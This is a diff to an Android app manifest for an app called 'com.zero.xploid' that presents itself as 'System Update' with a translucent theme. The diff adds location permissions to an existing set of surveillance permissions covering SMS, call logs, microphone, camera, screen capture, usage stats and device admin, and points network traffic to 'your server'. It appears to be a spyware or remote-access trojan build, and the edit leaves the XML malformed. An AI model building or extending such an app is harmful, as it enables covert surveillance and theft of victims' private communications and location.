@@ -2,34 +2,49 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.zero.xploid">
 
+    <!-- System overlay / floating windows -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
+    <!-- Foreground service types -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
+    <!-- Keep CPU awake -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
+    <!-- Media recording -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
 
+    <!-- Storage (for screenshots / recordings) -->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
 
+    <!-- Device info / phone state -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
+    <!-- Call logs -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
+    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
+    <!-- Package usage (foreground app) -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
 
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- Device Admin -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
 
     <application
@@ -37,7 +52,12 @@
         android:icon="@mipmap/ic_launcher"
         android:label="System Update"
         android:supportsRtl="true"
-        android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+
+        <!-- ⬇️ Network security – allow cleartext only to your server -->
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:usesCleartextTraffic="false"
+        >
 
         <activity
             android:name=".MainActivity"
